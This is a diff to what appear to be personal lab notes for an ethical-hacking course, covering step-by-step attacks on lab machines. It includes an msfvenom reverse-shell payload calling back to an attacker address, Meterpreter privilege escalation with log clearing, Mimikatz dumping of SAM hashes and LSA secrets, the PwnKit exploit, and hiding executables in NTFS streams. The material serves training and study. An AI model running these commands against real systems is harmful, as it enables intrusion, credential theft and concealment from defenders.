@@ -9,7 +9,7 @@
 4.  sudo snap install john-the-ripper  (installing john to crack the hash captured by Responder)
 5.  sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.1.11.txt        (cracking hash and give result)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+=========================================================================================================================================================================================================================================================================================================================================================================================================================================
 
 # Perform Buffer Overflow Attack to Gain Access to a Remote System
 --------------------------------------------------------------------
@@ -75,9 +75,10 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
    >>  ./shellcode.py
 
    >>  #whoami                  [*** GAME OVER ***]
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities 
+=========================================================================================================================================================================================================================================================================================================================================================================================================================================
+
+# Escalate Privileges(Windows 11) using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities 
 ------------------------------------------------------------------------------------------------
 >>> Parrot Machine [Attacker/10.10.1.13]
 1. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe (creating payload using msfvenom)
@@ -100,9 +101,15 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 16. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
 17. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
 18. getuid >> sysinfo >> run post/windows/gather/smart_hashdump (extracts the NTLM hashes)  >> clearev(clearing logs)
+# Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys 
+19. background  >>  use post/windows/manage/sticky_keys >> sessions i*  >>  set session 2(privileged session)  >> exploit 
+# Escalate Privileges to Gather Hashdump using Mimikatz
+20. load kiwi >>  help kiwi  >>  
+    >> lsa_dump_sam (to load NTLM Hash of all users.)
+    >> lsa_dump_secrets (LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.)
+    >> "password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password" (change the password of Admin using the password_change module)
 
-
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+=======================================================================================================================================================================================================================================================================================================================================================================================================================================
 
 # Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS(Network File System) :-
 --------------------------------------------------------------------------------------------
@@ -131,4 +138,42 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 20. find / -name "*.txt" -ls 2> /dev/null    (view all the .txt files on the system)
 21. route -n          (view the host/network names in numeric form)
 22. find / -perm -4000 -ls 2> /dev/null          (view the SUID executable binaries)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+============================================================================================================================================================================================================================================================================================================================================================================================================
+
+# Escalate Privileges(linux) by Exploiting Vulnerability in pkexec(CVE-2021-4034)
+--------------------------------------------------------------------------
+>>> PARROT MACHINE  
+1. whoami  >>   mkdir /tmp/pwnkit  >>  mv CVE-2021-4034 /tmp/pwnkit/  >>  cd /tmp/pwnkit/CVE-2021-4034/  >>  make  >> ./cve-2021-4034  >> whoami 
+
+=============================================================================================================================================================================================================================================================================================================================================================================================================
+
+# Hide files using NTFS streams(windows)
+-----------------------------------------
+
+1. In C:\ drive, create a New Folder, and name it magic.
+2. Navigate to the location C:\Windows\System32, copy calc.exe, and paste it to the C:\magic location
+3. Go to C:\magic >> click on file navigation bar >> type cmd  |OR|  open cmd and type cd C:\magic
+4. Now type in cmd,
+  >>> notepad readme.txt  >>  yes(Notepad pop-up appears)  >> type something in notepad  >> save(ctrl+s)  >> close notepad
+  >>> dir 
+  >>> "type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe"       (This command will hide calc.exe inside the readme.txt.)         
+Navigate to the directory C:\magic and delete calc.exe
+  >>> "mklink backdoor.exe readme.txt:calc.exe"    
+  >>> backdoor.exe     ( The calculator program will execute)
+For demonstration purposes, we are using the same machine to execute and hide files using NTFS streams. In real-time, attackers may hide malicious files in the target system and keep them invisible from the legitimate users by using NTFS streams, and may remotely execute them whenever required
+
+=============================================================================================================================================================================================================================================================================================================================================================================================================
+
+# Hide Data using White Space Steganography (Tool : SNOW.exe)
+
+
+
+
+
+
+
+
+
+
+
